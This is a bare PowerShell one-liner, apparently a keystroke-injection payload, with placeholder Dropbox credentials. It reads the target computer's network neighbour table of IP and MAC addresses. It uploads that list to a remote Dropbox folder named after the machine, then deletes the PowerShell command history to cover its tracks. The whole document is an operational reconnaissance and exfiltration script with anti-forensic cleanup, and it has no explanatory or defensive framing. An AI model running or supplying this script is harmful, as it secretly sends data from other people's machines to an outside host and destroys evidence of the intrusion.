$report = Get-NetNeighbor -State Stale,Reachable | Format-List -Property IPAddress,LinkLayerAddress | Out-String; Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method POST -Headers @{ "Authorization" = "Bearer $((Invoke-RestMethod -Uri "https://api.dropboxapi.com/oauth2/token" -Method POST -Headers @{"Content-Type" = "application/x-www-form-urlencoded"} -Body @{grant_type = "refresh_token"; refresh_token = "#REFRESH_TOKEN"; client_id = "#APP_KEY"; client_secret = "#APP_SECRET"}).access_token)"; "Content-Type" = "application/octet-stream"; "Dropbox-API-Arg" = '{ "path": "/reports/' + $env:computername + '.txt", "mode": "add", "autorename": true, "mute": false }' } -Body $report | Out-Null; Remove-Item (Get-PSReadLineOption).HistorySavePath; exit
